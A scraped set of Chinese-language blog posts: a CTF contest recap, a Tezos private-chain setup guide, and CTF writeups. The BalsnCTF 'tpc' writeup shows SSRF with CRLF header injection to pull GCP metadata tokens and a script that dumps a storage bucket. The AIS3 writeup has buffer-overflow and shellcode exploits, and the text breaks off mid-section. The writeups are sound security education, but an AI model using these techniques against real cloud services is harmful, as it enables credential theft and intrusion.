[{"title":"AIS3 EOF CTF 2020 心得","url":"/zh-tw/2021/ais3-eof-ctf-2020/","content":"\n\n## Qual\n在組隊的時候就差點找不到隊友(其實是我一直忘記這件事)，最後從 NCtfU 中直接拉滿人。\n這場最刺激的其實不是比賽，是比賽剛好在期末考前一週的週末，由於已經組好對了，所以就抱著期末考之後熬夜看就好的心態去比賽 XDDDD\n<!-- more -->\n初賽的部分其實貢獻不多，大多都是跟別人討論完題目之後別人就解出來了(隊友超級 Carry Orz)，所以其實我初賽可以說貢獻值 == 0 QQ\n\n最後跑去解 Abexcm100，一題 terrynini 出的 reverse，最後發現是我想太難了。\n一開始檔案拉進 PEiD 發現是 `PEspin` Packed 的時候就打算直接硬拆他還一直找 OEP。\n結果最後發現其實題目要的只是你慢慢追程式的行為而已，在初賽結束後半個小時才把他解掉了\n{% asset_img abe.jpg %}\n\n初賽最後拿到了 `12/15` 晉級決賽！\n{% asset_img qual.png %}\n\n## Final\n比賽前一天還跑去打工，結果隔天累爆QQ。\n第一天 9:30 開始報到，結果我 9:15 就到了，路上還遇到蔡粽大佬 Orz，開賽前也剛好遇到俊穎教授還有欣明教授，寒暄幾句之後就開始比賽惹。\n\n一開賽就喵了一眼 Web 題分別是 Regex Master 跟 WhoisTool 發現分別是 `JavaScript` 跟 `Golang` 寫了題目之後果斷放棄(欸，跑去看 Reverse。\n\nReverse 大部分都是 ARAY 系列題，是 Inndy 大佬出的，開來看之後發現是 Yara Rule，其中 rule 是經過 `yarac` 編譯過的。\n\n身為一個一言不合就硬幹的玩家，看到編譯過的檔案就是先用 `strings` 看，結果就猜到了 XD。\n檔案裡面有 44 個 Flag (只有其中一個是對的)，一開始就無腦挑幾個送就中了 XDD。後來回去看題目敘述才發現有提示可以把 Flag 各自拆成檔案，這才想起來應該要用 yara 下去掃才對 (這才是正規解)\n\nARAY2 的題目就基本上是一段一段的 flag 用變數存起來，只是我是用 `hexdump -C` 所以 output 會是 Hex + ASCII，看起來超醜，花了一點時間才拼出 flag。\n\n第一天的進度大概就這樣，看完 ARAY 前面兩題之後就又跑回去看 Web，雖然沒有任何進展 XDD，最後好像 9 點多就跳去床上爆睡了(還被地震搖醒)，一路睡到隔天早上。\n\n第二天大概就是第一天後半段的無限輪迴，不斷對著 Code 發呆，好險在第二天的下午合力解出了兩題，要不然真的會墊底 QQ。\n\n最後名次 `8/25` (包含 GCC)\n{% asset_img final.png %}\n\n\n其實 Final 還有一件趣事，在前些時間 ISIP 還有跟其他國家共同舉辦 [GCC](https://gcc.ac)，因為剛好認識的教授有被邀請去當講師，教授就指派我幫忙出題目，其中有兩題是原本打算 GCC 中最後的 Final 拿出來，結果後面好像欣明教授還有其他教授決定 GCC Final 跟 EOF Final 合辦，所以原本我出的題目也會出現在 EOF Final XDD。\n\n\n## 最後\n感謝隊友的無敵 Carry，在最後面的 Final 我們拿到了潛力獎，近期都在用實驗室的東西，已經跟 CTF 有點脫節了，最後還有拿獎其實有點意外 XD。\n\n感謝我的隊友 `r888800009`, `maple3142`, `JyunD` 帶我飛 Orz","categories":["writeup","AIS3","EOF","2020"]},{"title":"Tezos Blockchain Part I","url":"/zh-tw/2021/tezos-blockchain-part-1/","content":"\n\n## 緣由\n在大二上的某天，被教授指派自幹私架的 tezos 區塊鏈，但是老實說我對區塊鏈一點都不熟，就只好硬著頭皮硬幹。\n也因為 tezos 是當前區塊鏈較新的技術，所以 document ~~(跟屎一樣)~~ 很分散，需要自己動手挖。\n\n<!-- more -->\n\n這份紀錄主要應該會分成三個 part。\nPart I 是 tezos 到底在幹嘛，該如何架設 `carthagenet`。\nPart II 是 tezos 升級協定的過程還有 tezos 錢包的使用。\nPart III 是使用市面上的 blcok explorer 來將區塊鏈上的資料可視化。\n\n## 小抱怨 :full_moon_with_face:\n一開始架 tezos 選用的套件只有支援舊的協定，而且其中也有遇到一些 Bug。在 debug 還有實作的時候往往都會發現 tezos 官方 document 跟屎一樣，最後只好直接挖 source code 看還比較快。(雖然 source code 是用 ocaml 實作，真的沒有很理解他的語法就是了)\n\n## About Tezos\n請自行移駕 [Wikipedia](https://en.wikipedia.org/wiki/Tezos) XDD。\n\n主要有以下特點\n1. 使用 Proof-of-Stack(PoS) 而不是 Proof-of-Work(PoW)，這可以有效減少 PoW 運算所帶來的能源損耗問題，但是其中也是有一些缺點，其中一個就是有可能造成屯幣的情況\n2. 整個區塊鏈可以透過 Baker (礦工) 的共識來達到協定升級、更新，可以免除 Bitcoin 和 Ethereum 出現硬/軟分岔的問題。\n3. Tezos 自己推出了一個智慧型合約 Michealson，我個人也還在看這部分的資訊，聽說有使用一些驗證，可以降低智慧型合約的漏洞\n\n### 一些名詞解釋\n- Baker (礦工)\n- Endorsement (關於新區塊的行為)\n- Delegation (將資產委託 Baker 代為挖礦)\n\n## 架設 Tezos Blockchain (Carthagenet)\n這次使用的是 GitHub 上面的開源專案 [private-tezos-blockchain](https://github.com/racterub/private-tezos-blockchain) (這邊的 GitHub 連結是我的 Fork，修好一些東西了)\n\n**這邊都以開三個 node 為例子**\n\n\n### Build Base Image\n直接從 repo 裡面 build 起來就好了\n```sh\ndocker build -t ubuntu-tezos .\n```\n\n### Create Volume\n首先先開三個 volume 來存 node 資料\n```sh\ndocker volume create tezos-volume-1\ndocker volume create tezos-volume-2\ndocker volume create tezos-volume-3\n```\n\n### Fetch Binaries\n接下來要下載 tezos 需要的程式，注意這邊的 `GenesisKey` 需要一致，所以請存好你的 key。\n```sh\ndocker run --rm -v tezos-volume-1:/base-dir -it ubuntu-tezos fetch-binaries --base-chain carthagenet\ndocker run --rm -v tezos-volume-2:/base-dir -it ubuntu-tezos fetch-binaries --base-chain carthagenet --genesis-key <genesis-key>\ndocker run --rm -v tezos-volume-3:/base-dir -it ubuntu-tezos fetch-binaries --base-chain carthagenet --genesis-key <genesis-key>\n```\n\n### Start Node\n在這個步驟我們會一次將 `node`, `baker`, `endorser` 一起執行。\n\n執行之前請先注意一下一些事情\n1. 在執行指令時，預設會將 baker 的公私鑰吐出來，請好好存著\n2. `--peer` 的 ip:port 請依照實際情況調整，只需要指向我們第一個 node 的 RPC port 就好了\n3. 執行完之後吐一堆 error 跟 warning 是正常的，你只需要看到這個訊息 `p2p.maintenance: Too few connections (1)` ，後面的數字會依照你開起來的 node 增加，如果我們開三個 node，就會有兩個 peer，所以最後可以看到後面會是 `(2)`\n\n```sh\ndocker run --rm --name tezos-node-1 --expose 8733 -p 8732:8732 -p 8733:8733 -v tezos-volume-1:/base-dir -it start-baker --net-addr-port 8733\ndocker run --rm --name tezos-node-2 --expose 8734 -p 8734:8734 -v tezos-volume-2:/base-dir -it start-baker --net-addr-port 8734 --peer 172.17.0.2:8733\ndocker run --rm --name tezos-node-3 --expose 8735 -p 8735:8735 -v tezos-volume-3:/base-dir -it start-baker --net-addr-port 8734 --peer 172.17.0.2:8733\n```\n\n### 啟用區塊鏈\n先編輯 [scripts/parameters.json](https://github.com/racterub/private-tezos-blockchain/blob/master/parameters/parameters_carthagenet.json) 把你前面 start-baker 拿到的 public key 丟進 `bootstrap_accounts` 就好了\n最後把 `parameters.json` 丟進 node 裡面\n```sh\ndocker cp parameters.json tezos-node-1:/parameter.json\ndocker cp parameters.json tezos-node-2:/parameter.json\ndocker cp parameters.json tezos-node-3:/parameter.json\n```\n\n最後執行下面指令就好 (`-A` 指向第一個 node 的 IP，`-P` 指向 8732)\n```sh\ndocker exec tezos-node-1 ./scripts/activate-protocol.sh -A 172.17.0.2 -P 8732 --base-dir /base-dir --tezos-client /base-dir/tezos-client --parameters /parameters.json\n```\n\n執行完之後你的三個 node 就會開始挖礦了\n\n## 接下來就來聊聊修了什麼 bug\n1. 主要就是一開始在架的時候會發現三個 node 擺到後面資料會不同步，整個區塊鏈就爛掉了，最後翻到 [這行 code](https://github.com/racterub/private-tezos-blockchain/blob/08bf39ee36e579fee0c2d979609cb327ac3d9a42/scripts/start-baker.sh#L16) 中的 `--bootstrap-threshold` ，要更改成你 peer 的數量才對，所以這邊都要手動改\n2. 另外一個跟上面是在同一行 code，這個會在 Part III 講到\n\n## 如何使用 tezos\n可以從網路上載 [tezos-client](https://github.com/serokell/tezos-packaging/releases) 也可以直接從 node 裡面複製一份出來用\n\n### 轉帳\n從 a 轉 10000 tz 到 b (b 可以換成 public key)\n`./tezos-client transfer 10000 from a to b`\n(如果 b 的帳戶為 0 的話會需要加上 `--burn-cap 0.257`)\n\n### 帳戶總額\n取得 a 的帳戶總額，也可以換成 public key\n`./tezos get balance for a`\n\n## 總結\nPart I 主要是基本的架設，接下來會談到新的 test network，還有怎麼升上去。\n最後會自架 block explorer 來將資料可視化。","categories":["blockchain","tezos"]},{"title":"BalsnCTF 2020 [Web] tpc","url":"/zh-tw/2020/balsn20-tpc/","content":"\n\n## Intro\nSolver: @cc85nod, @stdlib.h @ZoneTwelve\n打醬油: @racterub\n\n\n\n```\nFlag is in the working directory\n\nhttp://35.194.175.80:8000\n\n[Update]\n[tpc] Info\nYou don't need to use fuzzing tools to guess file names, The flag file name is unguessable.\n```\n\n<!-- more -->\n\n這題主要是我隊友在打的，我只有戳前面的部分，後面就開始打醬油了 :poop:\n這邊的 writeup 主要是自己賽後重新自己實作，順便記錄怕自己健忘\n\n\n## Exploit!\n\n\n### File\n首先透過 `/query?site=URL` 可以發現使用 `http://` 和 `file://` 可以達成 SSRF 和任意讀檔。\n\n一開始我主要都在用 `file://` 找線索其中 `/etc/hosts` 可以知道機器為 GCP 主機。\n```\n/etc/hosts\n...\n\n169.254.169.254 metadata.google.internal metadata\n```\n\n接下來透過 `/proc/self/environ` 得知 working directory 為 `/opt/workdir`\n```\n00000000: 484f 5354 4e41 4d45 3d74 7063 2d31 0050  HOSTNAME=tpc-1.P\n00000010: 5954 484f 4e5f 5049 505f 5645 5253 494f  YTHON_PIP_VERSIO\n00000020: 4e3d 3139 2e30 2e33 0053 484c 564c 3d31  N=19.0.3.SHLVL=1\n00000030: 0048 4f4d 453d 2f68 6f6d 652f 6767 0047  .HOME=/home/gg.G\n00000040: 5047 5f4b 4559 3d30 4439 3644 4634 4434  PG_KEY=0D96DF4D4\n00000050: 3131 3045 3543 3433 4642 4642 3137 4632  110E5C43FBFB17F2\n00000060: 4433 3437 4541 3641 4136 3534 3231 4400  D347EA6AA65421D.\n00000070: 5041 5448 3d2f 7573 722f 6c6f 6361 6c2f  PATH=/usr/local/\n00000080: 6269 6e3a 2f75 7372 2f6c 6f63 616c 2f73  bin:/usr/local/s\n00000090: 6269 6e3a 2f75 7372 2f6c 6f63 616c 2f62  bin:/usr/local/b\n000000a0: 696e 3a2f 7573 722f 7362 696e 3a2f 7573  in:/usr/sbin:/us\n000000b0: 722f 6269 6e3a 2f73 6269 6e3a 2f62 696e  r/bin:/sbin:/bin\n000000c0: 004c 414e 473d 432e 5554 462d 3800 5059  .LANG=C.UTF-8.PY\n000000d0: 5448 4f4e 5f56 4552 5349 4f4e 3d33 2e37  THON_VERSION=3.7\n000000e0: 2e32 0050 5744 3d2f 6f70 742f 776f 726b  .2.PWD=/opt/work\n000000f0: 6469 7200                                dir.\n```\n\n當時也透過 `/proc/self/cmdline` 得到 server source code 檔名並得到 source code\n```\nimport urllib.request\n\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/query\")\ndef query():\n    site = request.args.get('site')\n    text = urllib.request.urlopen(site).read()\n    return text\n\n\n@app.route(\"/\")\ndef hello_world():\n    return \"/query?site=[your website]\"\n\n\nif __name__ == \"__main__\":\n    app.run(debug=False, host=\"0.0.0.0\", port=8000)\n```\n\n\n### HTTP\n隊友在發現主機為 GCP 之後就嘗試往 GCP 打，首先我們要先拿到 token。\n[GCP metadata API Docs 傳送門](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)\n\n取得 token 的 api 為 `http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`\n\n\n\n在使用 internal API 時需要在 header 放上 `Metadata-Flavor: Google`，也因為先前看到 source code，其中使用了 `urllib.request.urlopen`，而這個函式是可以達成 `header injection` [Source](https://xz.aliyun.com/t/5123)，所以最後的 payload 會長這樣\n```\ncurl \"http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0d%0aMetadata-Flavor:Google%0d%0aNO:\"\n\nResponse:\n{\"access_token\":\"ya29.c.KpcB5gfe-8qoLhk8NBKy-H_yC9TnU0ABfGS5CYsidL3jRFSjyHI6PIFOB9xmbHVaaxJwxY8ChP6i7Ya9pFM48Lm-EaElbtSakQw0j3WX_BvzaJcBpF0sgcZXZ-cqOvqhBwKi-qaEsKtQcq8UpW-my2bxYY25CuaoMccQGRNnOwxw3K9tJp_wvkA9JrzN0ZQ8G4MURP_M3Gwtcw\",\"expires_in\":3599,\"token_type\":\"Bearer\"}\n```\n\n另外，我們可以透過 `http://metadata.google.internal/computeMetadata/v1/project/project-id` 來取得專案 ID\n```\ncurl \"http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/project/project-id%20HTTP/1.1%0d%0aMetadata-Flavor:Google%0d%0aNO:\"\n\nResponse:\nbalsn-ctf-2020-tpc\n\n```\n\n所以我們得到 `project-id: balsn-ctf-2020-tpc`。\n\n之後我們因為在 compute 並沒有摸到奇怪的東西，所以隊友開始朝向 storage 摸。\n[GCP Storage API Docs](https://cloud.google.com/storage/docs/json_api/v1)\n以下是他的思路\n\n{% asset_img pumpkin_chat.png %}\n\n\n### GCP Storage\n首先我們要先找到 project 底下有什麼 buckets，那在打 API 的時候要加上在前面抓到的 `access_token`。\n[API Docs 傳送門](https://cloud.google.com/storage/docs/json_api/v1#buckets)\n```\ncurl \"https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc\" -H \"Authorization: Bearer ya29.c.KpcB5gcaFqy_aPerbtIpINj_ZBbI5gwYP34By0nRbUiDgtkIYUgriUlz4UnU7Z2_XbMs86NP4myDg3YOky7_15x-Q_LFA_E817d4yTFwCNi9ZGBtSlwrXbQEVIz4HNE1NSTXhkLp4T20qcmmyrK1zNBEq1yGhwHaDTzQJ03LamKtiJsUBt3qXZbQzY0F8ZgizivVpzdexoAw9Q\"\n\nResponse:\n{\n  \"kind\": \"storage#buckets\",\n  \"items\": [\n    {\n      \"kind\": \"storage#bucket\",\n      \"selfLink\": \"https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"id\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"name\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"projectNumber\": \"909684563558\",\n      \"metageneration\": \"1\",\n      \"location\": \"ASIA\",\n      \"storageClass\": \"STANDARD\",\n      \"etag\": \"CAE=\",\n      \"timeCreated\": \"2020-10-03T05:12:42.035Z\",\n      \"updated\": \"2020-10-03T05:12:42.035Z\",\n      \"iamConfiguration\": {\n        \"bucketPolicyOnly\": {\n          \"enabled\": false\n        },\n        \"uniformBucketLevelAccess\": {\n          \"enabled\": false\n        }\n      },\n      \"locationType\": \"multi-region\"\n    }\n  ]\n}\n```\n\n可以知道在 project `balsn-ctf-2020-tpc` 下有一個 bucket 叫做 `asia.artifacts.balsn-ctf-2020-tpc.appspot.com`\n\n那我們就可以透過 API 找到 bucket 底下的 objects\n[API Docs 傳送門](https://cloud.google.com/storage/docs/json_api/v1#objects)\n\n```\ncurl \"https://storage.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o\" -H \"Authorization: Bearer ya29.c.KpcB5gcaFqy_aPerbtIpINj_ZBbI5gwYP34By0nRbUiDgtkIYUgriUlz4UnU7Z2_XbMs86NP4myDg3YOky7_15x-Q_LFA_E817d4yTFwCNi9ZGBtSlwrXbQEVIz4HNE1NSTXhkLp4T20qcmmyrK1zNBEq1yGhwHaDTzQJ03LamKtiJsUBt3qXZbQzY0F8ZgizivVpzdexoAw9Q\"\n\nResponse:\n{\n  \"kind\": \"storage#objects\",\n  \"items\": [\n    {\n      \"kind\": \"storage#object\",\n      \"id\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com/containers/images/sha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4/1605158579380048\",\n      \"selfLink\": \"https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4\",\n      \"mediaLink\": \"https://storage.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&alt=media\",\n      \"name\": \"containers/images/sha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4\",\n      \"bucket\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"generation\": \"1605158579380048\",\n      \"metageneration\": \"1\",\n      \"contentType\": \"application/octet-stream\",\n      \"storageClass\": \"STANDARD\",\n      \"size\": \"25459212\",\n      \"md5Hash\": \"6awpD3oFqMhR8ubjY6vSkg==\",\n      \"crc32c\": \"Reg8Dw==\",\n      \"etag\": \"CNC+uteh/OwCEAE=\",\n      \"timeCreated\": \"2020-11-12T05:22:59.379Z\",\n      \"updated\": \"2020-11-12T05:22:59.379Z\",\n      \"timeStorageClassUpdated\": \"2020-11-12T05:22:59.379Z\"\n    },\n    ...etc\n}\n```\n\n而 `mediaLink` 所回傳的就是 object 檔案，格式為 `tar.gz`，我這邊可以寫個小工具把全部抓下來\n```python\n#!/usr/bin/env python3\nimport requests\nimport json\n\n\nstorageAPI = \"https://storage.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/\"\n\nkey = \"ya29.c.KpcB5QeCgub9nZXOQvTrYSa9f5twz8xclgeBH8Q0gnVDhRGubWNl74BNhaRhiEWSGNNW5B-k-r9_DURlKuO6SU3ZDlqHrUahA7QWNMElErrGmJVw3R-7CtsbKA6R4JzyKKtbX2lGv1JE3x6SEugqstPsG5ZFwfse93Y0l2iJixjoWXpQWYK2TmWexLo7CQkpzAacDKuLyiZOlQ\"\n\nheaders = {\n        \"Metadata-Flavor\": \"Google\",\n        \"Authorization\": \"Bearer {}\".format(key)\n        }\n\nr = requests.get(storageAPI, headers=headers)\n\nobjects = json.loads(r.text)\n\nobjects_link = [i['mediaLink'] for i in objects['items']]\n\nfor k,i in enumerate(objects_link):\n    print(k)\n    r = requests.get(i, headers=headers)\n\n    with open(\"{}.tar.gz\".format(k), \"wb\") as f:\n        f.write(r.content)\n```\n\n最後再把全部 object 解壓縮，我這邊直接寫一個 shell script `for i in $(ls | grep \"tar.gz\"); do tar zxvf $i; done`\n\n那最後就可以看到其實這是一個 disk 的備份，只是切成了好幾份\n\n{% asset_img obj_file.png %}\n\n### GET FLAG!\n最後就可以在 `/opt/workdir` 中找到 flag 了 (flag-6ba72dc9ffb518f5bcd92eee.txt)\n\nFLAG: `BALSN{What_permissions_does_the_service_account_need}`\n\n","categories":["writeup","balsn20","tpc"]},{"title":"AIS3 Pre-Exam 2019","url":"/zh-tw/2020/ais3-2019/","content":"\n\n![scoreboard](https://i.imgur.com/eUWoRWR.png)\n\n<!-- more -->\n# Pwn\n## Welcome BOF\n執行 binary 後得到下列文字\n`👻 They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.`\n\n在設置好 ubuntu 18.04 然後用 gdb 追了之後發現使用普通 exploit 方式會導致 binary 在 `xmm` 這個 assembly 直接 sigsegv，所以在跳其他函式的 address 前加一個 `ret gadget` 就好了\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\nr = remote('pre-exam-pwn.ais3.org', 10000)\n#r = process('./bof')\ncontext(arch='amd64', log_level='debug')\n\nr.sendlineafter('\\n', '\\x00'*56 + p64(0x0000000000400546) + p64(0x0000000000400687))\nr.interactive()\n```\n\nFlag: `AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}`\n\n## ORW\n簡單的 ORW，就直接上 payload\n\nPayload:\n```python\n#!/usr/bin/env python\n#-*- coding: utf-8 -*-\n\nfrom pwn import *\n\nr = remote('pre-exam-pwn.ais3.org', 10001)\n#r = process('./orw')\ncontext(arch='amd64',log_level='debug')\n\nelf = ELF('./orw')\nbss = elf.bss()\n\nshellcode = ''\nshellcode += asm(\"xor rsi, rsi\")\nshellcode += asm(\"xor rdx, rdx\")\nshellcode += asm(\"mov rax, 0x101010101010101\")\nshellcode += asm(\"push rax\")\nshellcode += asm('mov rax, 0x101010101010101 ^ 0x67616c662f77')\nshellcode += asm('xor [rsp], rax')\nshellcode += asm('mov rax, 0x726f2f656d6f682f')\nshellcode += asm('push rax')\nshellcode += asm(\"mov rdi, rsp\")\nshellcode += asm(\"mov rax, 0x2\")\nshellcode += asm(\"syscall\") #sys_open(\"/home/orw/flag\", 0, 0)\nshellcode += asm(\"mov rdi, rax\")\nshellcode += asm(\"mov rsi, %s\" % hex(bss))\nshellcode += asm(\"mov rdx, 0x30\")\nshellcode += asm(\"xor rax, rax\")\nshellcode += asm(\"syscall\") #sys_read(fd, bss_addr, 0x30)\nshellcode += asm(\"mov rax, 0x1\")\nshellcode += asm(\"mov rdi, 0x1\")\nshellcode += asm(\"mov rsi, %s\" % hex(bss))\nshellcode += asm('mov rdx, 0x30')\nshellcode += asm(\"syscall\") #sys_write(0x1, bss_addr, 0x30)\n\nr.sendlineafter(\"\\n\", shellcode)\nraw_input('#')\nr.sendlineafter('\\n', '\\x00'*40 + p64(0x6010a0))\nprint r.recv()\n```\n\nFlag: `AIS3{B4by_sh311c0d1ng_yeeeeeeeeeeeeeeeeeee_:)}`\n\n# Crypto\n\n## Tcash\n這題直接爆開就好\n\n題目：\n```python\nfrom hashlib import md5,sha256\nfrom secret import FLAG\ncand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@,- _{}'\n\nmd5s = []\nsha256s = []\nfor f in FLAG :\n    assert f in cand \n    md5s.append( int(md5(f.encode()).hexdigest(),16)%64 )\n    sha256s.append( int(sha256(f.encode()).hexdigest(),16)%64 )\n\n# md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]\n# sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]\n```\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom hashlib import md5, sha256\n\ncand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}'\n\nmd5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]\nsha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]\nflag = ''\n\nfor j in range(0, 168):\n    for i in cand:\n        print i\n        i_md5 = int(md5(i.encode()).hexdigest(), 16)%64\n        i_sha = int(sha256(i.encode()).hexdigest(), 16)%64\n        if md5s[j] == i_md5 and sha256s[j] == i_sha:\n            flag += i\n            break\n\nprint(\"GETFLAG :)\")\nprint flag\n```\n\nFlag: `AIS3{0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWAys TCat2019Key}`\n\n## RSA202\n給了兩組 c, n\n\n```\n((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0\n\ne : 540283027\nn1 : r * next_prime(r)\n4147205004274785831839429345273175843810008383684281776384156955313063939697851722599048915934550159810838630817611878938608964209420526101408285259660756614160588966196450613960131\nn2 : p * q\nnenc : pow(FLAG1, e, n1)\n1381530128905366229835031885023981456155250417226615037320326874456088155891241824286394351504686598020807575296495059981196560321402599060324041112306873501644386932506341759897439\nenc : pow(FLAG2, e, n2)\nn\n```\n\n由 `n1 = r * next_prime(r)` 可知 n1 的 |p-q| 極小，故可以用 `Fermat's Factorization method` 來還原 p, q。\n得到加密程式的 `r` 之後可以透過推導 `((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0`，得到 `p`\n\n最後就可以直接解密了\n\n`我是全部都在 ipython 做，所以沒留 script`\n\nFlag: `AIS3{S0me7im3s_I_h4tE_factorDB}`\n\n# Web\n## SimpleWindow\n這題我不太知道發生什麼事，我只知道我加了一個 proxy 攔 request 之後 flag 就彈出來了 XD\n\nFlag: `AIS3{D0_y0u_kn0w_Serv1ce_W0rker?}`\n\n## Hidden\n看原始碼會發現有 `main.019417bd.js` 這個檔案，發現是 `Vue.js`\n然後一開始有看到 `flag.js` 的字樣，但是沒用處。\n直到看到了一個很像加解密的 function\n\nmain.019417bd.js:\n```javascript\nvar r = function() {\n    return function() {\n        var r = Array.prototype.slice.call(arguments),\n            t = r.shift();\n        return r.reverse().map(function(r, e) {\n            return String.fromCharCode(r - t - 25 - e)\n        }).join(\"\")\n    }(12, 144, 165, 95, 167, 140, 95, 157, 94, 164, 91, 122, 111, 102) + 4..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split(\"\").map(function(r) {\n        return String.fromCharCode(r.charCodeAt() + -13)\n    }).join(\"\") + 1234274547001..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split(\"\").map(function(r) {\n        return String.fromCharCode(r.charCodeAt() + -13)\n    }).join(\"\") + 579..toString(36).toLowerCase() + function() {\n        var r = Array.prototype.slice.call(arguments),\n            t = r.shift();\n        return r.reverse().map(function(r, e) {\n            return String.fromCharCode(r - t - 44 - e)\n        }).join(\"\")\n    }(18, 190, 127, 170, 113)\n};\n```\n\n然後丟去 devtool 的 console 執行就會有 flag 了\n\nFlag: `AIS3{4r3_y0u_4_fr0n73nd_g33k?}`\n\n## d1v1n9\n一開始有個 hint 